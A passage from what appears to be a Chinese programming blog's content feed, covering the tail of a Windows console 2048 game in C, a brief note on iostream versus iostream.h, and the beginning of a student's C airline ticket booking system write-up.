++i) &#123;</span><br><span class="line">        <span class="comment">/* 变量j为列下标，变量k为待比较（合并）项的下标，循环进入时k&lt;j */</span></span><br><span class="line">        <span class="keyword">int</span> j, k;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>, k = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (board[i][j] &gt; <span class="number">0</span>) <span class="comment">/* 找出k后面第一个不为空的项，下标为j，之后分三种情况 */</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][k] == board[i][j]) &#123;</span><br><span class="line">                    <span class="comment">/* 情况1：k项和j项相等，此时合并方块并计分 */</span></span><br><span class="line">                    score += board[i][k++] *= <span class="number">2</span>;</span><br><span class="line">                    board[i][j] = <span class="number">0</span>;</span><br><span class="line">                    if_need_add_num = <span class="number">1</span>; <span class="comment">/* 需要生成随机数和刷新界面 */</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (board[i][k] == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">/* 情况2：k项为空，则把j项赋值给k项，相当于j方块移动到k方块 */</span></span><br><span class="line">                    board[i][k] = board[i][j];</span><br><span class="line">                    board[i][j] = <span class="number">0</span>;</span><br><span class="line">                    if_need_add_num = <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">/* 情况3：k项不为空，且和j项不相等，此时把j项赋值给k+1项，相当于移动到k+1的位置 */</span></span><br><span class="line">                    board[i][++k] = board[i][j];</span><br><span class="line">                    <span class="keyword">if</span> (j != k) &#123;</span><br><span class="line">                        <span class="comment">/* 判断j项和k项是否原先就挨在一起，若不是则把j项赋值为空（值为0） */</span></span><br><span class="line">                        board[i][j] = <span class="number">0</span>;</span><br><span class="line">                        if_need_add_num = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 右移 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_right</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 仿照左移操作，区别仅仅是j和k都反向遍历 */</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> j, k;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">2</span>, k = <span class="number">3</span>; j &gt;= <span class="number">0</span>; --j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (board[i][j] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][k] == board[i][j]) &#123;</span><br><span class="line">                    score += board[i][k--] *= <span class="number">2</span>;</span><br><span class="line">                    board[i][j] = <span class="number">0</span>;</span><br><span class="line">                    if_need_add_num = <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (board[i][k] == <span class="number">0</span>) &#123;</span><br><span class="line">                    board[i][k] = board[i][j];</span><br><span class="line">                    board[i][j] = <span class="number">0</span>;</span><br><span class="line">                    if_need_add_num = <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    board[i][--k] = board[i][j];</span><br><span class="line">                    <span class="keyword">if</span> (j != k) &#123;</span><br><span class="line">                        board[i][j] = <span class="number">0</span>;</span><br><span class="line">                        if_need_add_num = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 上移 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_up</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 仿照左移操作，区别仅仅是行列互换后遍历 */</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> j, k;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>, k = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (board[j][i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[k][i] == board[j][i]) &#123;</span><br><span class="line">                    score += board[k++][i] *= <span class="number">2</span>;</span><br><span class="line">                    board[j][i] = <span class="number">0</span>;</span><br><span class="line">                    if_need_add_num = <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (board[k][i] == <span class="number">0</span>) &#123;</span><br><span class="line">                    board[k][i] = board[j][i];</span><br><span class="line">                    board[j][i] = <span class="number">0</span>;</span><br><span class="line">                    if_need_add_num = <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    board[++k][i] = board[j][i];</span><br><span class="line">                    <span class="keyword">if</span> (j != k) &#123;</span><br><span class="line">                        board[j][i] = <span class="number">0</span>;</span><br><span class="line">                        if_need_add_num = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 下移 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_down</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 仿照左移操作，区别仅仅是行列互换后遍历，且j和k都反向遍历 */</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> j, k;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">2</span>, k = <span class="number">3</span>; j &gt;= <span class="number">0</span>; --j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (board[j][i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[k][i] == board[j][i]) &#123;</span><br><span class="line">                    score += board[k--][i] *= <span class="number">2</span>;</span><br><span class="line">                    board[j][i] = <span class="number">0</span>;</span><br><span class="line">                    if_need_add_num = <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (board[k][i] == <span class="number">0</span>) &#123;</span><br><span class="line">                    board[k][i] = board[j][i];</span><br><span class="line">                    board[j][i] = <span class="number">0</span>;</span><br><span class="line">                    if_need_add_num = <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    board[--k][i] = board[j][i];</span><br><span class="line">                    <span class="keyword">if</span> (j != k) &#123;</span><br><span class="line">                        board[j][i] = <span class="number">0</span>;</span><br><span class="line">                        if_need_add_num = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 清屏 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear_screen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 重设光标输出位置清屏可以减少闪烁，system("cls")为备用清屏命令，均为Windows平台相关*/</span></span><br><span class="line">    COORD pos = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), pos);</span><br><span class="line">    CONSOLE_CURSOR_INFO info = &#123;<span class="number">1</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &amp;info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 刷新界面 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">refresh_show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    clear_screen();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"                  GAME: 2048     SCORE: %05d     BEST: %06d\n"</span>, score, best);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"               --------------------------------------------------"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 绘制方格和数字 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n                             ┌────┬────┬────┬────┐\n"</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                             │"</span>);</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (board[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"  %d │"</span>, board[i][j]);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (board[i][j] &lt; <span class="number">100</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" %d │"</span>, board[i][j]);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (board[i][j] &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" %d│"</span>, board[i][j]);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (board[i][j] &lt; <span class="number">10000</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%4d│"</span>, board[i][j]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">int</span> n = board[i][j];</span><br><span class="line">                    <span class="keyword">int</span> k;</span><br><span class="line">                    <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt; <span class="number">20</span>; ++k) &#123;</span><br><span class="line">                        n = n &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"2^%02d│"</span>, k); <span class="comment">/* 超过四位的数字用2的幂形式表示，如2^13形式 */</span></span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"    │"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n                             ├────┼────┼────┼────┤\n"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n                             └────┴────┴────┴────┘\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"               --------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"                  [W]:UP [S]:DOWN [A]:LEFT [D]:RIGHT [Q]:EXIT"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (get_null_count() == <span class="number">0</span>) &#123;</span><br><span class="line">        check_game_over();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 判断是否输掉游戏 */</span></span><br><span class="line">        <span class="keyword">if</span> (if_game_over) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\r                      GAME OVER! TRY THE GAME AGAIN? [Y/N]:     \b\b\b\b"</span>);</span><br><span class="line">            CONSOLE_CURSOR_INFO info = &#123;<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">            SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &amp;info); <span class="comment">/* 重置光标位置 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 判断是否准备退出游戏 */</span></span><br><span class="line">    <span class="keyword">if</span> (if_prepare_exit) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\r                   DO YOU REALLY WANT TO QUIT THE GAME? [Y/N]:   \b\b"</span>);</span><br><span class="line">        CONSOLE_CURSOR_INFO info = &#123;<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">            SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &amp;info); <span class="comment">/* 重置光标位置 */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fflush(<span class="number">0</span>); <span class="comment">/* 刷新输出缓冲区 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 初始化游戏 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_game</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"cls"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取游戏存档路径，Windows下放在C:\Users\UserName\AppData\Local\2048目录下 */</span></span><br><span class="line">    <span class="keyword">char</span> m_lpszDefaultDir[MAX_PATH];</span><br><span class="line">    <span class="keyword">char</span> szDocument[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(m_lpszDefaultDir, <span class="number">0</span>, _MAX_PATH);</span><br><span class="line">    LPITEMIDLIST pidl = <span class="literal">NULL</span>;</span><br><span class="line">    SHGetSpecialFolderLocation(<span class="literal">NULL</span>, CSIDL_LOCAL_APPDATA, &amp;pidl);</span><br><span class="line">    <span class="keyword">if</span> (pidl &amp;&amp; SHGetPathFromIDList(pidl, szDocument)) &#123;</span><br><span class="line">    GetShortPathName(szDocument, m_lpszDefaultDir, _MAX_PATH);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sprintf</span>(config_path, <span class="string">"%s\\2048"</span>, m_lpszDefaultDir);</span><br><span class="line">    <span class="keyword">if</span> (_access(config_path, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">    _mkdir(config_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sprintf</span>(config_path, <span class="string">"%s\\2048\\2048.dat"</span>, m_lpszDefaultDir);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 读取游戏最高分数 */</span></span><br><span class="line">    FILE *fp = fopen(config_path, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">        fread(&amp;best, <span class="keyword">sizeof</span>(best), <span class="number">1</span>, fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        best = <span class="number">0</span>;</span><br><span class="line">        fp = fopen(config_path, <span class="string">"w"</span>);</span><br><span class="line">        <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">            fwrite(&amp;best, <span class="keyword">sizeof</span>(best), <span class="number">1</span>, fp);</span><br><span class="line">            fclose(fp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    reset_game();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 释放游戏 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_game</span><span class="params">(<span class="keyword">int</span> signal)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"cls"</span>);</span><br><span class="line">    CONSOLE_CURSOR_INFO info = &#123;<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &amp;info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 程序 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[c/c++ iostream库与iostream.h库]]></title>
      <url>/%E7%AC%94%E8%AE%B0/ckwd5ws92004dd0ucf7qdp1r4/</url>
      <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream.h&gt;    //c非标准输入输出流</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;      //c++标准输入输出流</span></span></span><br></pre></td></tr></table></figure>
<h3 id="iostream-库"><a href="#iostream-库" class="headerlink" title="iostream 库"></a>iostream 库</h3><p>c++中为了避免名字定义冲突,引入了 namespace(名字空间) 定义,在使用的时候输出需要引用 <code>std::cout&lt;&lt;x;</code> </p>
<p>引入 <code>std::</code> 有三种方法:</p>
<ol>
<li><p><code>using namespace std;
cout&lt;&lt;x;</code></p>
</li>
<li><p><code>using std::cout;
cout&lt;&lt;x;</code></p>
</li>
<li><p><code>std::cout&lt;&lt;x;</code></p>
</li>
</ol>
<p>可见第一种方法最为便捷</p>
<h3 id="iostream-h-库"><a href="#iostream-h-库" class="headerlink" title="iostream.h 库"></a>iostream.h 库</h3><p>继承了c语言的标准库文件,没有引入名字空间定义,当代码中使用了<code>&lt;iostream.h&gt;</code>库时,输出可直接引用 <code>cout&lt;&lt;x;</code></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[c语言 飞机订票系统]]></title>
      <url>/%E7%A8%8B%E5%BA%8F/ckwd5ws94004hd0uc2j4m81vq/</url>
      <content type="html"><![CDATA[<h2 id="大一夏学期暑假c语言实训作业"><a href="#大一夏学期暑假c语言实训作业" class="headerlink" title="大一夏学期暑假c语言实训作业"></a>大一夏学期暑假c语言实训作业</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>我根据课程要求, 运用宏、指针、输入输出流、二分查找等知识点,编写了一个方便机场工作人员对机票的管理，以提高机场工作人员对机票管理工作的效率的飞机订票系统,本系统实现的功能有浏览、查询、录入、修改、订票、退票、排序等,具体各功能实现代码在下方贴出。</p>
<h3 id="各部分功能实现"><a href="#各部分功能实现" class="headerlink" title="各部分功能实现"></a>各部分功能实现</h3><h4 id="开始界面"><a href="#开始界面" class="headerlink" title="开始界面"></a>开始界面</h4><p>我把开始界面放在一个子函数里,通过主函数<code>main()</code>对文件读取用的<code>readData()</code>和<code>userData()</code>子函数以及开始界面<code>main_menu()</code>子函数进行调用,分别跳转到对应功能的子函数里.</p>
<p>代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"color F1"</span>);<span class="comment">//修改界面颜色,第一位前景色,第二位背景色</span></span><br><span class="line">    readData();  <span class="comment">//文件读取(乘客)</span></span><br><span class="line">    userData();  <span class="comment">//文件读取(管理员)</span></span><br><span class="line">    main_menu();  <span class="comment">//开始界面</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>为开始界面设计了较美观的面板,并用switch函数定义各功能需跳转到的子函数.</p>
<p>代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main_menu</span><span class="params">()</span>   <span class="comment">//开始界面 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    account=<span class="number">0</span>;<span class="comment">//无需输入管理员密码 </span></span><br><span class="line">    <span class="keyword">int</span> choic_number; <span class="comment">//命令选择</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   ◤＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝◥\n"</span></span><br><span class="line">		<span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">		<span class="string">"\t\t\t\t   ‖      欢迎使用飞机订票系统         ‖\n"</span></span><br><span class="line">		<span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">		<span class="string">"\t\t\t\t   ‖                        by Damya  ‖\n"</span></span><br><span class="line">		<span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">	        <span class="string">"\t\t\t\t   ‖===================================‖\n"</span></span><br><span class="line">		<span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">		<span class="string">"\t\t\t\t   ‖    1.浏览航班信息                 ‖\n"</span></span><br><span class="line">		<span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">		<span class="string">"\t\t\t\t   ‖    2.查找航班信息                 ‖\n"</span></span><br><span class="line">		<span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">		<span class="string">"\t\t\t\t   ‖    3.订票                         ‖\n"</span></span><br><span class="line">		<span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">		<span class="string">"\t\t\t\t   ‖    4.退票                         ‖\n"</span></span><br><span class="line">		<span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">		<span class="string">"\t\t\t\t   ‖    5.浏览乘客信息                 ‖\n"</span></span><br><span class="line">		<span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">		<span class="string">"\t\t\t\t   ‖    6.退出                         ‖\n"</span></span><br><span class="line">		<span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">		<span class="string">"\t\t\t\t   ‖    0.管理                         ‖\n"</span></span><br><span class="line">		<span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">	<span class="string">"\t\t\t\t   ◣＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝◢\n\n\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\t\t\t\t   请在0-6中选择并回车键执行:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;choic_number);</span><br><span class="line">    <span class="keyword">switch</span>(choic_number)<span class="comment">//输入对应编号跳转到对应子函数 </span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            Login(); <span class="keyword">break</span>;<span class="comment">//管理</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            List(); <span class="keyword">break</span>;<span class="comment">//浏览 </span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            Search();<span class="keyword">break</span>;<span class="comment">//查询</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            Book();<span class="keyword">break</span>;<span class="comment">//订票</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            Back();<span class="keyword">break</span>;<span class="comment">//退票</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            bill();<span class="keyword">break</span>;<span class="comment">//订单</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            drop();<span class="keyword">break</span>;<span class="comment">//退出 </span></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">//输入非编号内容,跳转到开始界面 </span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   输入错误，请重新输入!\n\n"</span>);</span><br><span class="line">            main_menu();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序运行图:</p>
<p><img src="./1.png" alt="图2-1"></p>
<h4 id="浏览界面"><a href="#浏览界面" class="headerlink" title="浏览界面"></a>浏览界面</h4><p>向文件里输入输出数据时我用到了c++的iostream库,查阅资料时发现调用c++的一些函数来实现这个功能非常方便.</p>
<p>代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;<span class="comment">// 定义浏览时的行数 </span></span><br><span class="line">    <span class="built_in">string</span> str;<span class="comment">// 声明一个空字符串,用于储存数据 </span></span><br><span class="line">    <span class="function">ifstream <span class="title">fin</span><span class="params">(<span class="string">"plane.txt"</span>, ios::in)</span></span>;  <span class="comment">// 定义一个来自plane.txt的输入流,并用in方式读取,文件不存在不会创建新文件 </span></span><br><span class="line">    <span class="keyword">if</span>(!fin)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   文件不存在!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在浏览航班   ‖---\n\n"</span>); </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n\t\t     航班ID    起降时间      起飞日期      起点站      终点站      余票      价格\n"</span>);</span><br><span class="line">    <span class="keyword">while</span>(getline(fin, str))<span class="comment">// 读取一行字符直到换行符,是c++的函数 </span></span><br><span class="line">    &#123;</span><br><span class="line">        cnt++;<span class="comment">// 依次向下读取数据 </span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; str &lt;&lt;<span class="built_in">endl</span>;<span class="comment">// 将字符串输出到屏幕并换行 </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   按任意键返回上一层!\n\n"</span>);</span><br><span class="line">    getch();</span><br><span class="line">    main_menu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序运行图:</p>
<p><img src="./2.png" alt="图2-2"></p>
<h4 id="查询界面"><a href="#查询界面" class="headerlink" title="查询界面"></a>查询界面</h4><p>通过两种不同的查询方式满足不同需求,分别引用<code>Search()</code>子函数里需要用到的两个子函数<code>Search_id()</code>和<code>Search_end()</code>,数据的排序用到二分查找算法,会在第八点指出.</p>
